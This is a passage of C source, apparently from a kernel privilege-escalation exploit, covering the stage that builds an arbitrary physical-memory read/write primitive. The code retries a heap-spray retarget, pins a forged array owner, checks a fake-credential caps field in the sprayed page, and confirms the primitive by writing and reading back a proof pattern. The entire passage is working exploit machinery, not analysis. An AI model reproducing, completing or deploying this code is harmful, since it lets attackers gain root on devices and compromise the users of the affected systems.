                   teed, errno);
        landed = 0;
      }
      SYSCHK(close(holder[0]));
      SYSCHK(close(holder[1]));
      if (landed_only && !landed)
        goto retry;
    }
    rwf_track_spray(page_base);
    if (landed)
      break;
  retry:
    pr_warning("rwf retarget miss (not connected or store dropped) — retry %d\n",
               att + 1);
  }
  if (!landed) {
    pr_warning("rwf retarget never landed — refusing dead channel\n");
    return 0;
  }
  pr_info("rwf stage: retarget round done landed=1 (spray tracked=%d)\n",
          rwf_nspray);
  pr_info("rwf stage: pin a0 begin\n");
  int pin_rc = rwf_pin_owner(rwf_a0);
  pr_info("rwf stage: pin a0 done rc=%d\n", pin_rc);
  pr_info("rwf stage: array pinned\n");

  /* No fill_rd_ring, no map-wp: writes go through forged slots in rd's
   * array with exact off/len (see rwf_phys_write). rd's ring currently has
   * just its marker slot (index 0); ops advance in lockstep with the forge
   * (budget: 32 slots = array-1 size). */
  static const unsigned char proof_pattern[] = "RWFORGE-PROOF-OK";
  uintptr_t proof = page_base + RWF_PROOF_OFF;
  unsigned char back[sizeof(proof_pattern)];
  /* Read-verify FIRST (reads never create ring buffers, so this isolates
   * the forge chain — growth/append/retarget — from write-merge behavior):
   * the fake-cred caps field in the current spray page is 0xFF. On the BZA5
   * device the write op's peek showed junk while the guest lands both — this
   * tells us which half of the channel is broken there. */
  if (!getenv("GL_FASTROOT_MINIMAL")) {
    pr_info("rwf stage: self-test read-verify begin\n");
    unsigned char sig = 0;
    uintptr_t sig_addr = page_base + SKB_DATA_DELTA + CRED_COPY_OFF + 48;
    if (!rwf_phys_read(sig_addr, &sig, sizeof(sig)) || sig != 0xFF) {
      rwf_err("rwf read-verify failed sig=%02x\n", sig);
      return 0;
    }
    pr_info("rwf stage: self-test read-verify ok\n");
  }
  if (getenv("GL_FASTROOT_MINIMAL")) {
    pr_success("rwforge physrw installed a0=%d rd=%d\n", rwf_a0, rwf_rd);
    return 1;
  }
  pr_info("rwf stage: self-test write begin\n");
  if (!rwf_phys_write(proof, proof_pattern, sizeof(proof_pattern))) {
    rwf_err("rwf write self-test failed\n");
    return 0;
  }
  pr_info("rwf stage: self-test write ok\n");
  pr_info("rwf stage: self-test read begin\n");
  memset(back, 0, sizeof(back));
  if (!rwf_phys_read(proof, back, sizeof(back)) ||
      memcmp(back, proof_pattern, sizeof(back)) != 0) {
    rwf_err("rwf write self-test readback failed\n");
    return 0;
  }

  pr_success("rwforge physrw installed a0=%d rd=%d\n", rwf_a0, rwf_rd);
  return 1;
}
